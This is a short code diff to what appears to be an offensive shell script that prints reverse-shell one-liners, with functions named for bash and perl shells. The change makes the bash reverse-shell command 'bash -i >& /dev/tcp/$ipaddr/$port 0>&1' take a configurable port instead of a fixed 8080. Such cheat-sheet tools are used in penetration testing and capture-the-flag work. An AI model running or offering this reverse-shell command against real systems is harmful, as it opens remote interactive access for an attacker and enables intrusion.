@@ -79,7 +79,7 @@ function reverse_shell_list(){
 
 function bash_shell(){
 
-	echo -e "${pos}${Yellow}Bash shell:${Color_Off} bash -i >& /dev/tcp/${Red}$ipaddr/8080${Color_Off} 0>&1"
+	echo -e "${pos}${Yellow}Bash shell:${Color_Off} bash -i >& /dev/tcp/${Red}$ipaddr/$port${Color_Off} 0>&1"
 }
 
 function perl_shell(){
